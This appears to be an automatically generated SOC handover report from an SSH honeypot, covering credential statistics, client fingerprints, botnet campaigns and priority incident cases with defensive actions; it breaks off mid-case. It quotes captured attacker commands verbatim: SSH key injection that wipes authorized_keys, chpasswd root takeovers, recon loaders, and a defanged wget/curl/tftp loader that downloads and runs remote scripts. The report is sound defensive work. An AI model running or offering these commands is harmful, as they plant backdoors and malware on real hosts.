# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-02 |
| **Generated At** | 2026-10-02T17:00:08Z |
| **Shift Time** | 17:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **415** |
| Confirmed Threats | **347** |
| False Positives Filtered | **68** (16.4%) |
| Unique Attacker IPs | **270** |
| Countries of Origin | **46** |
| High Severity Cases | **189** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **226** |
| Malware Samples Analyzed | **5** HIGH · **23** MED · 15 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **1157** |
| Unique Credential Pairs | **882** |
| Unique Usernames | **536** |
| Unique Passwords | **584** |
| Successful Auth Pairs | **1052** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 175 |
| `admin` | 95 |
| `345gs5662d34` | 74 |
| `support` | 26 |
| `administrator` | 22 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 74 |
| `3245gs5662d34` | 74 |
| `admin` | 34 |
| `support` | 27 |
| `123456` | 27 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 74 |
| `root` | `3245gs5662d34` | 27 |
| `support` | `support` | 26 |
| `admin` | `admin` | 25 |
| `root` | `` | 13 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `175.152.156.201` | 2026-10-02T03:00:16 |
| `admin` | `admin` | `130.12.180.51` | 2026-10-02T03:00:17 |
| `root` | `` | `94.154.43.69` | 2026-10-02T03:24:12 |
| `admin` | `admin` | `196.189.236.67` | 2026-10-02T03:32:19 |
| `servitor` | `servitor` | `10.0.0.73` | 2026-10-02T03:37:20 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-10-02T03:37:21 |
| `servitor` | `3245gs5662d34` | `10.0.0.73` | 2026-10-02T03:37:22 |
| `test` | `zxc123` | `10.0.0.73` | 2026-10-02T03:41:38 |
| `support` | `support` | `176.53.159.196` | 2026-10-02T03:44:55 |
| `root` | `qwerty2025` | `152.200.205.180` | 2026-10-02T03:47:30 |
| `345gs5662d34` | `345gs5662d34` | `152.200.205.180` | 2026-10-02T03:47:32 |
| `root` | `3245gs5662d34` | `152.200.205.180` | 2026-10-02T03:47:32 |
| `testuser` | `1qaz!QAZ` | `115.190.192.112` | 2026-10-02T03:51:42 |
| `345gs5662d34` | `345gs5662d34` | `115.190.192.112` | 2026-10-02T03:51:48 |
| `testuser` | `3245gs5662d34` | `115.190.192.112` | 2026-10-02T03:51:49 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `47.251.78.84` | 2026-10-02T03:54:34 |
| `root` | `kimi` | `10.0.0.73` | 2026-10-02T03:57:45 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-10-02T03:57:50 |
| `root` | `000000` | `92.118.39.77` | 2026-10-02T03:59:19 |
| `root` | `111111` | `92.118.39.77` | 2026-10-02T04:01:03 |
_… 1032 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **415** |
| Sessions with Fingerprint | **30** |
| Unique HASSH Fingerprints | **30** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 144 |
| Go SSH scanner | 55 |
| OpenSSH | 21 |
| Paramiko (Python) | 8 |
| PuTTY | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 104 | 55 |
| `03a80b21afa8...` | Modern SSH client | 13 | 7 |
| `16443846184e...` | Generic scanner | 10 | 5 |
| `2ec37a7cc8da...` | Mirai/variant | 10 | 3 |
| `390ffe68a68c...` | Modern SSH client | 10 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 104 | 55 | Mirai/variant |
| `95420f9d932d...` | libssh | 16 | 15 | — |
| `03a80b21afa8...` | libssh | 13 | 7 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 10 | 5 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 10 | 3 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 10 | 3 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `19532158b559...` | libssh | 5 | 5 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **23** |
| Campaign Clusters | **10** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 252 | 3 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 10 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 53 | 53 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 4 | 1 | `T1105, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 4 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:zXHbTjrfIS6j"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `189.89.12.240`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.150`, `92.118.39.77`, `2.57.122.76`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **270** |
| Unique ASNs | **117** |
| High-Risk ASNs | **83** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 66 | HIGH |
| `AS398324` | Censys, Inc. | 11 | HIGH |
| `AS213412` | ONYPHE SAS | 10 | LOW |
| `AS396982` | Google LLC | 10 | HIGH |
| `AS63949` | Akamai Connected Cloud | 9 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 6 | HIGH |
| `AS25369` | Hydra Communications Ltd | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (187)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c62f2a19195e

| Field | Detail |
|---|---|
| **Source IP** | `175.152.156[.]201` |
| **First Seen** | 2026-10-02 03:00 |
| **Last Seen** | 2026-10-02 03:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:00:14` | `cowrie.session.connect` |
| `2026-10-02 03:00:14` | `cowrie.client.version` |
| `2026-10-02 03:00:14` | `cowrie.client.kex` |
| `2026-10-02 03:00:16` | `cowrie.login.success` |
| `2026-10-02 03:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.152.156[.]201` to AbuseIPDB if not already reported
- [ ] Block `175.152.156[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0c0137e8f38

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-10-02 03:00 |
| **Last Seen** | 2026-10-02 03:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:00:16` | `cowrie.session.connect` |
| `2026-10-02 03:00:16` | `cowrie.client.version` |
| `2026-10-02 03:00:16` | `cowrie.client.kex` |
| `2026-10-02 03:00:17` | `cowrie.login.success` |
| `2026-10-02 03:00:18` | `cowrie.session.params` |
| `2026-10-02 03:00:18` | `cowrie.command.input` |
| `2026-10-02 03:00:18` | `cowrie.session.file_download` |
| `2026-10-02 03:00:18` | `cowrie.session.file_download` |
| `2026-10-02 03:00:18` | `cowrie.log.closed` |
| `2026-10-02 03:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f63de871bfe6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-10-02 03:24 |
| **Last Seen** | 2026-10-02 03:24 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:24:12` | `cowrie.session.connect` |
| `2026-10-02 03:24:12` | `cowrie.login.success` |
| `2026-10-02 03:24:13` | `cowrie.session.params` |
| `2026-10-02 03:24:14` | `cowrie.command.input` |
| `2026-10-02 03:24:14` | `cowrie.command.input` |
| `2026-10-02 03:24:14` | `cowrie.session.file_download` |
| `2026-10-02 03:24:14` | `cowrie.session.file_download` |
| `2026-10-02 03:24:15` | `cowrie.session.file_download` |
| `2026-10-02 03:24:15` | `cowrie.session.file_download` |
| `2026-10-02 03:24:15` | `cowrie.session.file_download.failed` |
| `2026-10-02 03:24:15` | `cowrie.session.file_download` |
| `2026-10-02 03:24:16` | `cowrie.session.file_download` |
| `2026-10-02 03:24:29` | `cowrie.log.closed` |
| `2026-10-02 03:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c926268bcc0d

| Field | Detail |
|---|---|
| **Source IP** | `196.189.236[.]67` |
| **First Seen** | 2026-10-02 03:32 |
| **Last Seen** | 2026-10-02 03:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:32:19` | `cowrie.session.connect` |
| `2026-10-02 03:32:19` | `cowrie.client.version` |
| `2026-10-02 03:32:19` | `cowrie.client.kex` |
| `2026-10-02 03:32:19` | `cowrie.login.success` |
| `2026-10-02 03:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.236[.]67` to AbuseIPDB if not already reported
- [ ] Block `196.189.236[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75e3b1024bcd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-02 03:44 |
| **Last Seen** | 2026-10-02 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:44:54` | `cowrie.session.connect` |
| `2026-10-02 03:44:54` | `cowrie.client.version` |
| `2026-10-02 03:44:54` | `cowrie.client.kex` |
| `2026-10-02 03:44:55` | `cowrie.login.success` |
| `2026-10-02 03:44:55` | `cowrie.direct-tcpip.request` |
| `2026-10-02 03:44:55` | `cowrie.direct-tcpip.data` |
| `2026-10-02 03:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-912e8259003a

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]180` |
| **First Seen** | 2026-10-02 03:47 |
| **Last Seen** | 2026-10-02 03:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:47:29` | `cowrie.session.connect` |
| `2026-10-02 03:47:29` | `cowrie.client.version` |
| `2026-10-02 03:47:29` | `cowrie.client.kex` |
| `2026-10-02 03:47:30` | `cowrie.login.success` |
| `2026-10-02 03:47:30` | `cowrie.session.params` |
| `2026-10-02 03:47:30` | `cowrie.command.input` |
| `2026-10-02 03:47:30` | `cowrie.command.failed` |
| `2026-10-02 03:47:31` | `cowrie.log.closed` |
| `2026-10-02 03:47:31` | `cowrie.session.params` |
| `2026-10-02 03:47:31` | `cowrie.command.input` |
| `2026-10-02 03:47:31` | `cowrie.session.file_download` |
| `2026-10-02 03:47:31` | `cowrie.log.closed` |
| `2026-10-02 03:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]180` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88903e0e8c53

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]180` |
| **First Seen** | 2026-10-02 03:47 |
| **Last Seen** | 2026-10-02 03:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:47:31` | `cowrie.session.connect` |
| `2026-10-02 03:47:31` | `cowrie.client.version` |
| `2026-10-02 03:47:31` | `cowrie.client.kex` |
| `2026-10-02 03:47:32` | `cowrie.login.success` |
| `2026-10-02 03:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]180` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7b8fcba7375

| Field | Detail |
|---|---|
| **Source IP** | `115.190.192[.]112` |
| **First Seen** | 2026-10-02 03:51 |
| **Last Seen** | 2026-10-02 03:51 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:51:38` | `cowrie.session.connect` |
| `2026-10-02 03:51:38` | `cowrie.client.version` |
| `2026-10-02 03:51:38` | `cowrie.client.kex` |
| `2026-10-02 03:51:42` | `cowrie.login.success` |
| `2026-10-02 03:51:44` | `cowrie.session.params` |
| `2026-10-02 03:51:44` | `cowrie.command.input` |
| `2026-10-02 03:51:44` | `cowrie.command.failed` |
| `2026-10-02 03:51:44` | `cowrie.log.closed` |
| `2026-10-02 03:51:46` | `cowrie.session.params` |
| `2026-10-02 03:51:46` | `cowrie.command.input` |
| `2026-10-02 03:51:46` | `cowrie.session.file_download` |
| `2026-10-02 03:51:46` | `cowrie.log.closed` |
| `2026-10-02 03:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.192[.]112` to AbuseIPDB if not already reported
- [ ] Block `115.190.192[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41522e46b9cb

| Field | Detail |
|---|---|
| **Source IP** | `115.190.192[.]112` |
| **First Seen** | 2026-10-02 03:51 |
| **Last Seen** | 2026-10-02 03:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:51:47` | `cowrie.session.connect` |
| `2026-10-02 03:51:47` | `cowrie.client.version` |
| `2026-10-02 03:51:47` | `cowrie.client.kex` |
| `2026-10-02 03:51:48` | `cowrie.login.success` |
| `2026-10-02 03:51:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.192[.]112` to AbuseIPDB if not already reported
- [ ] Block `115.190.192[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd5dfa45636c

| Field | Detail |
|---|---|
| **Source IP** | `47.251.78[.]84` |
| **First Seen** | 2026-10-02 03:54 |
| **Last Seen** | 2026-10-02 03:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:54:34` | `cowrie.session.connect` |
| `2026-10-02 03:54:34` | `cowrie.login.success` |
| `2026-10-02 03:54:35` | `cowrie.session.params` |
| `2026-10-02 03:54:35` | `cowrie.command.input` |
| `2026-10-02 03:54:35` | `cowrie.command.failed` |
| `2026-10-02 03:54:35` | `cowrie.command.input` |
| `2026-10-02 03:54:35` | `cowrie.command.failed` |
| `2026-10-02 03:54:35` | `cowrie.command.input` |
| `2026-10-02 03:54:37` | `cowrie.log.closed` |
| `2026-10-02 03:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.78[.]84` to AbuseIPDB if not already reported
- [ ] Block `47.251.78[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94966b6728be

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-10-02 03:59 |
| **Last Seen** | 2026-10-02 03:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 03:59:16` | `cowrie.session.connect` |
| `2026-10-02 03:59:16` | `cowrie.client.version` |
| `2026-10-02 03:59:16` | `cowrie.client.kex` |
| `2026-10-02 03:59:19` | `cowrie.login.success` |
| `2026-10-02 03:59:20` | `cowrie.session.params` |
| `2026-10-02 03:59:20` | `cowrie.command.input` |
| `2026-10-02 03:59:20` | `cowrie.command.input` |
| `2026-10-02 03:59:20` | `cowrie.command.input` |
| `2026-10-02 03:59:20` | `cowrie.command.input` |
| `2026-10-02 03:59:20` | `cowrie.command.input` |
| `2026-10-02 03:59:20` | `cowrie.command.success` |
| `2026-10-02 03:59:20` | `cowrie.command.input` |
| `2026-10-02 03:59:20` | `cowrie.command.input` |
| `2026-10-02 03:59:20` | `cowrie.command.input` |
| `2026-10-02 03:59:20` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16e44c30d9ff

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-10-02 04:01 |
| **Last Seen** | 2026-10-02 04:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:01:00` | `cowrie.session.connect` |
| `2026-10-02 04:01:01` | `cowrie.client.version` |
| `2026-10-02 04:01:01` | `cowrie.client.kex` |
| `2026-10-02 04:01:03` | `cowrie.login.success` |
| `2026-10-02 04:01:04` | `cowrie.session.params` |
| `2026-10-02 04:01:04` | `cowrie.command.input` |
